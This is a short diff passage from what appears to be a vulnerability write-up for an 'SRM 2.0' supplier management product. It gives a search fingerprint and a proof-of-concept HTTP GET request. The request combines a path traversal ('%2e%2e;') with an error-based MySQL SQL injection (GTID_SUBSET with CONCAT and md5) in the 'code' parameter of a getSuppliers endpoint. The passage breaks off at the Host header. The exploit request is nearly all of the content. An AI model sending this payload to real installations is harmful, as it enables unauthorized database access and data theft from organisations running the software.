@@ -6,7 +6,7 @@
 title=="SRM 2.0"
 ```
 
-## poc
+## POC
 ```java
 GET /adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers?code=1%27+AND+GTID_SUBSET%28CONCAT%280x7e%2C%28SELECT+md5%281234%29%29%2C0x7e%29%2C7973%29--+WkOF&name=1 HTTP/1.1
 Host: 
